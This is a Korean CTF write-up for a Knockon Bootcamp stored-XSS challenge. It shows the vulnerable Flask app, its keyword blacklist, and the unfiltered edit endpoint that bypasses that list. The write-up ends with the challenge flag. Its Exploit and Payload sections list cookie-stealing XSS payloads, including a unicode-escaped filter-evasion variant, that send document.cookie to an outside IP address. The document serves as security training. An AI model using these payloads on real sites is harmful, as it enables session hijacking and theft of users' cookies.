---
title: "[Writeup] Knockon Bootcamp - 5.3 xss_WAF_3"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
  - Filter Bypass
last_modified_at: 2024-09-09T10:00:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10042/>

![5.3 xss_WAF_3 1](/assets/images/writeup/web-hacking/knock-on/5-3_XSS_1.png)

![5.3 xss_WAF_3 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)

![5.3 xss_WAF_3 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)


|

|

|

### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS
- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, render_template, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100), nullable=False)
    content = db.Column(db.Text, nullable=False)

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/board")
def board():
    posts = Post.query.all()
    message = request.args.get("message", None)
    return render_template("board.html", posts=posts, message=message)

black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window","<",">"]

@app.route("/add", methods=["GET", "POST"])
def add_post():
    if request.method == "POST":
        title = request.form["title"] #no not try XSS in title!
        content = request.form["content"].lower()
        for black in black_list :
            if black in content:
                return render_template("add_post.html",alert="<script>alert('No Hack!');window.history.back();</script>")
        post = Post(title=title, content=content)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("add_post.html")

@app.route("/post/<int:post_id>")
def view_post(post_id):
    post = Post.query.get_or_404(post_id)
    return render_template("post.html", post=post)

@app.route("/delete/<int:post_id>", methods=["GET"])
def delete_post(post_id):
    post = Post.query.get_or_404(post_id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for("board"))

@app.route("/edit/<int:post_id>", methods=["GET", "POST"])
def edit_post(post_id):
    post = Post.query.get_or_404(post_id)
    if request.method == "POST":
        post.title = request.form["title"]
        post.content = request.form["content"]
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("edit_post.html", post=post)

@app.route("/search", methods=["GET", "POST"])
def search():
    if request.method == "POST":
        search_term = request.form["search"]
        posts = Post.query.filter(
            Post.title.contains(search_term) | Post.content.contains(search_term)
        ).all()
        return render_template("search.html", posts=posts)
    return render_template("search.html")

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("board.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("board.html", posts=posts, message=message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10006, debug=True)

```

|

|

|

## 코드 분석

### add_post()

---

```python
black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window","<",">"]

@app.route("/add", methods=["GET", "POST"])
def add_post():
    if request.method == "POST":
        title = request.form["title"] #no not try XSS in title!
        content = request.form["content"].lower()
        for black in black_list :
            if black in content:
                return render_template("add_post.html",alert="<script>alert('No Hack!');window.history.back();</script>")
        post = Post(title=title, content=content)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("add_post.html")
```

`black_list`에 `<>`도 추가됨

|

|

### edit()

---

```python
@app.route("/edit/<int:post_id>", methods=["GET", "POST"])
def edit_post(post_id):
    post = Post.query.get_or_404(post_id)
    if request.method == "POST":
        post.title = request.form["title"]
        post.content = request.form["content"]
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("edit_post.html", post=post)
```

`add_post()`와는 달리 `edit()`에서는 필터링이 없음. 여기서 스크립트 코드 추가하면 됨

|

|

|

## Exploit

```html
<script>location.href='http://20.41.120.97:10010/'+document.cookie</script>

<body onload="location.href='http://20.41.120.97:10010/'+document.cookie">

<svg/\u006Fnload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>
```

게시물 작성 → 수정 → 스크립트 삽입

|

|

|

## Payload

```html
<script>location.href='http://20.41.120.97:10010/'+document.cookie</script>
```

|

|

### FLAG

---

```sh
K0{the_best_bypass_is_find_another_endpoint!}
```

|

---